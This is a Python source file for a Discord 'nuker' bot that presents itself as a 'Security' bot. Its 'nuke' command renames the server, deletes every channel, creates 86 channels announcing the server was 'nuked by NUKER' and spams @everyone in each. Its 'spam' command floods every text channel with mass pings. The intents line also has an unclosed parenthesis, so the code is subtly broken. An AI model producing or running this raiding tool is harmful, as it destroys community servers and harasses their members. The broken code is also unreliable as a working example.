# dont remove thoses unless you know what youre doing
import discord
from discord.ext import commands, tasks
import os
import asyncio

# local variables
Bot_token = "" # add your bot's token betwen the ""
prefix = '!'
n = 0

# === preparing the bot ===
intents = discord.Intents.default()
intents = discord.Intents(messages=True, guilds=True
client = commands.Bot(command_prefix=prefix, intents=intents)


# prints whenever the bot is ready 
@client.event
async def on_ready():
    print('Bot is online')
    await client.change_presence(activity=discord.Game('Security'))


# ping command
@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms')
# nuke command 
@client.command()
async def nuke(ctx):

    await ctx.guild.edit(name='Karma') #Decide what to change the server name to

    for c in ctx.guild.channels:
        await c.delete()

    guild = ctx.message.guild

    n=0
    while(n<=85):
        await guild.create_text_channel('This server got nuked by NUKER!') # Decide what should be the name of the text channels that you will create
        n = n+1

    for c in ctx.guild.text_channels:
             await c.send('@everyone Nuked by NUKER!') # Put the messages you want to be spammed here
             await c.send('@everyone karma!')
             await c.send('@everyone karma!')
             await c.send('@everyone karma!')
             await c.send('@everyone karma!')
# spam command
@client.command()
async def spam(ctx):
    for c in ctx.guild.text_channels:
             await c.send('@everyone karma!') #Put what to be spammed in the brackets 
             await c.send('@everyone karma!')
             await c.send('@everyone karma!')
             await c.send('@everyone karma!')
             await c.send('@everyone karma!')

client.run(Bot_token)
